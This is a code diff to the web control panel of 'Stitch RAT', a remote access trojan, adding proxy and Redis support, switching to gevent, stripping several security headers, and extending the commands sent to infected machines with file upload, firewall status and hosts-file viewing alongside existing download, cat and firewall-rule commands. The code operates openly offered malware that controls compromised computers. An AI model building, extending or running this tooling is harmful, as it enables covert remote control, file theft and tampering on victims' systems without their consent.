@@ -31,6 +31,7 @@ from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 from flask_wtf.csrf import CSRFProtect
 from werkzeug.security import generate_password_hash, check_password_hash
+from werkzeug.middleware.proxy_fix import ProxyFix
 
 sys.path.insert(0, os.path.dirname(__file__))
 from Application.Stitch_Vars.globals import *
@@ -88,6 +89,26 @@ def get_stitch_server():
 # ============================================================================
 app = Flask(__name__)
 
+# Configure ProxyFix for reverse proxy support (nginx, Apache, etc.)
+# Only enable if behind a trusted proxy
+if os.getenv('STITCH_BEHIND_PROXY', 'false').lower() in ('true', '1', 'yes'):
+    # Configure for common proxy setups
+    x_for = int(os.getenv('STITCH_PROXY_X_FOR', '1'))
+    x_proto = int(os.getenv('STITCH_PROXY_X_PROTO', '1'))
+    x_host = int(os.getenv('STITCH_PROXY_X_HOST', '1'))
+    x_prefix = int(os.getenv('STITCH_PROXY_X_PREFIX', '0'))
+    
+    app.wsgi_app = ProxyFix(
+        app.wsgi_app,
+        x_for=x_for,
+        x_proto=x_proto,
+        x_host=x_host,
+        x_prefix=x_prefix
+    )
+    print(f"✓ ProxyFix enabled: x_for={x_for}, x_proto={x_proto}, x_host={x_host}, x_prefix={x_prefix}")
+else:
+    print("ℹ️  ProxyFix disabled - set STITCH_BEHIND_PROXY=true if behind reverse proxy")
+
 # Use persistent secret key from Config
 app.config['SECRET_KEY'] = Config.SECRET_KEY
 app.config['SESSION_COOKIE_HTTPONLY'] = Config.SESSION_COOKIE_HTTPONLY
@@ -115,19 +136,21 @@ print(f"✓ WebSocket Update Interval: {Config.WEBSOCKET_UPDATE_INTERVAL} second
 print("=" * 75)
 
 # Rate Limiting Configuration
+# Support Redis for distributed rate limiting or fallback to memory
+redis_url = os.getenv('STITCH_REDIS_URL', 'memory://')
+if redis_url != 'memory://':
+    print(f"✓ Rate limiting: Using Redis at {redis_url}")
+else:
+    print("⚠️  Rate limiting: Using memory backend (not shared across instances)")
+    print("   For production with multiple workers, set STITCH_REDIS_URL=redis://localhost:6379")
+
 limiter = Limiter(
     get_remote_address,
     app=app,
     default_limits=[f"{DEFAULT_RATE_LIMIT_DAY} per day", f"{DEFAULT_RATE_LIMIT_HOUR} per hour"],
-    storage_uri="memory://",
+    storage_uri=redis_url,
     strategy="fixed-window"
 )
-
-# Initialize SocketIO
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', ping_timeout=60, ping_interval=25)
-
-# Integrate all enhancements (must be after SocketIO initialization)
-app, socketio, limiter = integrate_enhancements(app, socketio, limiter)
 
 # CORS Configuration - Load allowed origins from environment  
 def get_cors_origins():
@@ -175,9 +198,12 @@ def get_cors_origins():
     print(f"✓ CORS: Restricted to {len(origins)} origin(s): {', '.join(origins)}")
     return origins if origins else ['http://localhost:5000']
 
-# Initialize SocketIO with configured CORS origins
+# Initialize SocketIO with configured CORS origins (single initialization)
 cors_origins = get_cors_origins()
-socketio = SocketIO(app, cors_allowed_origins=cors_origins, async_mode='eventlet')
+socketio = SocketIO(app, cors_allowed_origins=cors_origins, async_mode='gevent', ping_timeout=60, ping_interval=25)
+
+# Integrate all enhancements (must be after SocketIO initialization)
+app, socketio, limiter = integrate_enhancements(app, socketio, limiter)
 
 # ============================================================================
 # Global State
@@ -241,6 +267,37 @@ def load_credentials():
 
 # Initialize users (will be loaded at startup)
 USERS = {}
+
+# Load credentials at module level for WSGI compatibility
+def initialize_credentials():
+    """Initialize credentials at app startup"""
+    global USERS
+    if not USERS:  # Only load if not already loaded
+        try:
+            loaded_creds = load_credentials()
+            USERS.update(loaded_creds)
+            print("✓ Credentials loaded from environment variables")
+        except RuntimeError as e:
+            print(f"ERROR: {str(e)}")
+            raise
+
+# Initialize credentials when module is imported (WSGI compatibility)
+# Only try once to avoid infinite loops during testing/import
+_credentials_initialized = False
+
+def ensure_credentials_loaded():
+    """Ensure credentials are loaded exactly once"""
+    global _credentials_initialized
+    if not _credentials_initialized:
+        try:
+            initialize_credentials()
+            _credentials_initialized = True
+        except RuntimeError:
+            # Don't fail on import - let main handle this
+            pass
+
+# Try to load credentials on import
+ensure_credentials_loaded()
 
 # ============================================================================
 # Helper Functions
@@ -343,38 +400,9 @@ def login_required(f):
 # ============================================================================
 @app.after_request
 def set_server_header(response):
-    """Set comprehensive security headers to prevent common web vulnerabilities"""
+    """Set basic server header - other security headers handled by enhancements module"""
     # Generic server header to prevent fingerprinting
     response.headers['Server'] = 'WebServer'
-    
-    # X-Frame-Options: Prevent clickjacking attacks
-    response.headers['X-Frame-Options'] = 'DENY'
-    
-    # X-Content-Type-Options: Prevent MIME sniffing
-    response.headers['X-Content-Type-Options'] = 'nosniff'
-    
-    # X-XSS-Protection: XSS protection for older browsers
-    response.headers['X-XSS-Protection'] = '1; mode=block'
-    
-    # Strict-Transport-Security: Enforce HTTPS (only when HTTPS is enabled)
-    if Config.ENABLE_HTTPS:
-        response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
-    
-    # Content-Security-Policy: Comprehensive policy to prevent XSS and data injection
-    csp_policy = (
-        "default-src 'self'; "
-        "script-src 'self' 'unsafe-inline' https://cdn.socket.io; "
-        "style-src 'self' 'unsafe-inline'; "
-        "img-src 'self' data:; "
-        "connect-src 'self'; "
-        "font-src 'self'; "
-        "object-src 'none'; "
-        "base-uri 'self'; "
-        "form-action 'self'; "
-        "frame-ancestors 'none'"
-    )
-    response.headers['Content-Security-Policy'] = csp_policy
-    
     return response
 
 # ============================================================================
@@ -842,7 +870,7 @@ def _perform_handshake(conn_id):
 
         # Confirm magic string (unencrypted) with small retry/backoff
         confirm = None
-        expected = base64.b64encode(b'stitch_shell').decode()
+        expected = base64.b64encode(b'stitch_shell')
         for attempt in range(3):
             try:
                 confirm = server.receive(sock, encryption=False)
@@ -856,7 +884,8 @@ def _perform_handshake(conn_id):
         aes_id = None
         for attempt in range(3):
             try:
-                aes_id = server.receive(sock, encryption=False)
+                aes_id_bytes = server.receive(sock, encryption=False)
+                aes_id = aes_id_bytes.decode('utf-8') if isinstance(aes_id_bytes, bytes) else aes_id_bytes
                 break
             except Exception as e:
                 if attempt == 2:
@@ -996,6 +1025,11 @@ COMMAND_DEFINITIONS = {
                 'confirmation': True,
                 'dangerous': False,
                 'windows_only': True
+            },
+            'status': {
+                'parameters': [],
+                'confirmation': False,
+                'dangerous': False
             }
         }
     },
@@ -1014,6 +1048,11 @@ COMMAND_DEFINITIONS = {
                     {'name': 'hostname', 'type': 'text', 'prompt': 'Enter desired hostname to remove from the hosts file', 'required': True}
                 ],
                 'confirmation': True,
+                'dangerous': False
+            },
+            'show': {
+                'parameters': [],
+                'confirmation': False,
                 'dangerous': False
             }
         }
@@ -1113,12 +1152,12 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
     import builtins
     from contextlib import redirect_stdout
     
-    # Greenlet-local storage for input queue (works with eventlet/gevent)
+    # Greenlet-local storage for input queue (works with gevent)
     try:
-        from eventlet.corolocal import local as greenlet_local
+        from gevent.local import local as greenlet_local
         execution_local = greenlet_local()
     except ImportError:
-        # Fallback for testing/non-eventlet environments
+        # Fallback for testing/non-gevent environments
         import threading
         execution_local = threading.local()
     
@@ -1333,6 +1372,11 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                         stlib.download(cmd_args)
                     else:
                         return output_header + "❌ Download requires file path parameter"
+                elif cmd_name == 'upload':
+                    if cmd_args:
+                        stlib.upload(cmd_args)
+                    else:
+                        return output_header + "❌ Upload requires file path parameter"
                 elif cmd_name == 'cat':
                     if cmd_args:
                         stlib.cat(cmd_args)
@@ -1367,21 +1411,27 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
                 # Interactive commands now supported with parameter queue
                 elif cmd_name == 'firewall':
                     if not cmd_args:
-                        return output_header + "❌ Firewall requires subcommand: open/close/allow"
+                        return output_header + "❌ Firewall requires subcommand: open/close/allow/status"
                     subcommand = cmd_args.split()[0].lower()
                     if subcommand in ['open', 'close', 'allow']:
                         if not input_queue:
                             return output_header + f"❌ Firewall {subcommand} requires parameters. Use inline syntax or web UI parameter form."
                         stlib.firewall(cmd_args)
+                    elif subcommand == 'status':
+                        # Firewall status doesn't require parameters
+                        stlib.firewall(cmd_args)
                     else:
                         return output_header + f"❌ Unknown firewall subcommand: {subcommand}"
                 elif cmd_name == 'hostsfile':
                     if not cmd_args:
-                        return output_header + "❌ Hostsfile requires subcommand: update/remove"
+                        return output_header + "❌ Hostsfile requires subcommand: update/remove/show"
                     subcommand = cmd_args.split()[0].lower()
                     if subcommand in ['update', 'remove']:
                         if not input_queue:
                             return output_header + f"❌ Hostsfile {subcommand} requires parameters."
+                        stlib.hostsfile(subcommand)
+                    elif subcommand == 'show':
+                        # Hostsfile show doesn't require parameters
                         stlib.hostsfile(subcommand)
                     else:
                         return output_header + f"❌ Unknown hostsfile subcommand: {subcommand}"
@@ -1656,12 +1706,12 @@ if __name__ == '__main__':
     print("🔐 Stitch RAT - Secure Web Interface")
     print("="*75 + "\n")
     
-    # Load and validate credentials before starting
-    # Note: USERS is module-level, so this assignment updates the global dict
+    # Ensure credentials are loaded (may already be loaded at module level)
     try:
-        loaded_creds = load_credentials()
-        USERS.update(loaded_creds)
-        log_debug("✓ Credentials loaded from environment variables", "INFO", "Security")
+        ensure_credentials_loaded()
+        if not USERS:
+            raise RuntimeError("No users loaded - credentials initialization failed")
+        log_debug("✓ Credentials verified for web interface startup", "INFO", "Security")
     except RuntimeError as e:
         print(str(e))
         sys.exit(1)
